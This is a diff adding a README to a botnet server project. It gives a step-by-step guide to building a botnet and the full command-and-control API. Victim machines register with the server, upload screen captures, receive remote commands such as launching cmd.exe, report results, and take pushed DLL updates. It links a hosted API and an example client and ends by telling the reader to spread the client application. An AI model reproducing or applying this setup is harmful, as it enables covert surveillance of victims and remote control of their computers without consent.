@@ -1,2 +1,101 @@
 # BotNet-Server
 C# .Net BotNet Server and everything about it
+
+How to build your own botnet?
+- Create API
+- - You can use our API example, wrote on JS, or create yourself API
+- - - Warning! If you want to create your API, you must realize this methods (Every responses have JSON parsing)
+- - - Example Response (Type) is a Types of BotNet Server UI
+- - - - post /api/v1/screens/:id
+- - - - - Example Request: /api/v1/screens/0
+- - - - - Example Request Body: ScreenByte without sid
+- - - - - Example Response: sid for next request (uint)
+- - - - post /api/v1/screens/:id/:sid
+- - - - - Example Request: /api/v1/screens/0/0
+- - - - - Example Request Body: ScreenByte without sid
+- - - - - Example Response: void
+- - - - get /api/v1/screens/:id
+- - - - - Example Request: /api/v1/screens/0
+- - - - - Example Response: {"id":0, "screens":[{"sid":0, "bytes":[0,0,0,0,0,0...]}]} (Screen)
+- - - - get /api/v1/client
+- - - - - Example Request: /api/v1/client
+- - - - - Example Response: [{"id":0,"nameofpc":"PizhikCoder"},{"id":1,"nameofpc":"Zerumi"}] (IP[])
+- - - - get /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Response: 1 (Uint) // count of messages
+- - - - get /api/v1/responses
+- - - - - Example Request: /api/v1/responses
+- - - - - Example Response: [{"id":0, "response":[{"rid":0,"response":"Done! Time used: 0ms"}]}, {...}] (Responses[])
+- - - - get /api/v1/messages/:id
+- - - - - Example Request: /api/v1/messages/0
+- - - - - Example Response: {"id":0,"command":"/start^cmd.exe","ids":["0","1","2","3","4","5","6"]} (Message)
+- - - - post /api/v1/client
+- - - - - Example Request: /api/v1/client
+- - - - - Example Request Body: IP without ID
+- - - - - Example Response: 0 (UInt) // Your ID in system
+- - - - post /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Request Body: Message without ID
+- - - - - Example Response: {"id":0,"command":"/start^cmd.exe","ids":["0","1","2","3","4","5","6"]} (Message) // but this response is useless
+- - - - delete /api/v1/messages
+- - - - - Example Request: /api/v1/messages
+- - - - - Example Response: void
+- - - - get /api
+- - - - - Example Request: /api
+- - - - - Example Response: {"uri":" http://botnet-api.glitch.me/ ","version":1,"port":"3000","environment":"development","clients":1,"messages":1} (Info) // If version = 2, address in ApiRequest will be /api/v2/..., be careful
+- - - - get /api/v1/responses/:id/:rid
+- - - - - Example Request: /api/v1/responses/0/0
+- - - - - Example Response: {"rid":0, "response": "Done! Time used 0ms"} (Response)
+- - - - post /api/v1/responses/:id
+- - - - - Example Request: /api/v1/responses/0
+- - - - - Example Response: 1 (UInt) // count of responses
+- - - - delete /api/v1/responses
+- - - - - Example Request: /api/v1/responses
+- - - - - Example Response: void
+- - - - delete /api/v1/client/:id
+- - - - - Example Request: /api/v1/client/0
+- - - - - Example Response: void
+- - - - get /api/v1/admin/:password
+- - - - - Example Request: /api/v1/admin/qwerty
+- - - - - Example Response: false (Boolean)
+- - - - get /sandbox
+- - - - - Example Request: /sandbox
+- - - - - Example Response: "Who are you?" (String)
+- - - - get /sandbox/:id
+- - - - - Example Request: /sandbox/0
+- - - - - Example Response: 0 (UInt)
+- - - - post /api/v1/sandbox
+- - - - - Example Request: /api/v1/sandbox
+- - - - - Request Body: "Make a coffee" (String)
+- - - - - Example Response: Error (code 418)
+- - - - delete /sandbox
+- - - - - Example Request: /sandbox
+- - - - - Example Response: "Deleted!" (String)
+- - - - post /api/v1/update
+- - - - - Example Request: /api/v1/update
+- - - - - Example Request Body: UpdateFile
+- - - - - Example Response: void
+- - - - post /api/v1/nextupdate
+- - - - - Example Request: /api/v1/nextupdate
+- - - - - Example Request Body: UpdateFile without filename
+- - - - - Example Response: void
+- - - - get /api/v1/update
+- - - - - Example Request: /api/v1/update
+- - - - - Example Response: {"filename":"CommandHandler.dll","filebytes":[0,0,0,0,0,0,0,0...]} (UpdateFile)
+- - - - get /api/v1/support/versions/:version
+- - - - - Example Request: /api/v1/support/versions/1.6.0.0
+- - - - - Example Response: {"version":"1.6.0.0","isDeprecated":false,"isUpdateNeeded":false,"isNotLatest":false,"cmdlib":["2.1.0.0"],"m3md2":["1.3.0.0"],"m3md2_startup":["1.2.0.0"]} (VerifyVersion)
+- - Download API on a server
+- Create MineWeb API
+- - You can use our API example, wrote on JS, or create yourself API
+- - - Warning! If you want to create your API, you must realize this methods (Every responses have JSON parsing)
+- - - - get /scripts/:script
+- - - - post /scripts/:script
+- - - - delete /scripts/:script
+- - Download API on a server
+- Setup Client
+- - Example Client for http://botnet-api.glitch.me/ here: https://github.com/PizhikCoder/HttpClient
+- Setup Server UI
+- - In Login Screen write server address and password
+- - For change MineWeb address, go "Manage" -> "Settings" -> "API", and write MineWeb API address here
+All right. Now you need to spread client application.
